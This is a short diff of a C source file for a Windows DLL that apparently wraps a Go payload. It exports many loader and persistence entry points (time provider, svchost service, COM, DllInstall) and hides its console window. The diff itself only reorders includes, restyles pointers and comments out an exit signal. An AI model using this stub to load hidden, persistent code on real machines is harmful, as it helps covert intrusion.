@@ -56,8 +56,8 @@
 #define UNICODE
 #define EXPORT __declspec(dllexport)
 
-#include <winsock.h>
 #include <windows.h>
+#include <winsock.h>
 #include <timeprov.h>
 
 #include "flurry.h"
@@ -97,10 +97,10 @@ EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {
 EXPORT HRESULT WINAPI TimeProvClose(TimeProvHandle p) {
     return 0;
 }
-EXPORT HRESULT WINAPI RegisterModule(DWORD v, void* m, void* g) {
+EXPORT HRESULT WINAPI RegisterModule(DWORD v, void *m, void *g) {
     return 0;
 }
-EXPORT HRESULT WINAPI DllGetClassObject(void* x, void *i, void* p) {
+EXPORT HRESULT WINAPI DllGetClassObject(void *x, void *i, void *p) {
     HANDLE c = GetConsoleWindow();
     if (c != NULL) {
         ShowWindow(c, 0);
@@ -115,7 +115,7 @@ EXPORT HRESULT WINAPI TimeProvOpen(WCHAR *n, TimeProvSysCallbacks *c, TimeProvHa
     return 0;
 }
 
-EXPORT VOID WINAPI ServiceMain(DWORD n, LPCWSTR* a) {
+EXPORT VOID WINAPI ServiceMain(DWORD n, LPCWSTR *a) {
     $export();
 }
 EXPORT VOID WINAPI SvchostPushServiceGlobals(LPVOID g) {}
@@ -132,7 +132,7 @@ EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
         DisableThreadLibraryCalls(h);
     }
     if (r == DLL_PROCESS_DETACH) {
-        GenerateConsoleCtrlEvent(1, 0); // Generate a SIGTERM signal to tell Go to exit cleanly.
+        // GenerateConsoleCtrlEvent(1, 0); // Generate a SIGTERM signal to tell Go to exit cleanly.
     }
     return TRUE;
 }
